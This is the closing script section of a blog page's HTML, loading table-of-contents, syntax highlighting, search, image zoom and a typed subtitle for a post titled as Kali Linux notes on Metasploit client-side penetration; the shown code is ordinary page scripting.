      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>





  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "Kali Linux笔记(一百零五)：MSF--客户端渗透&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
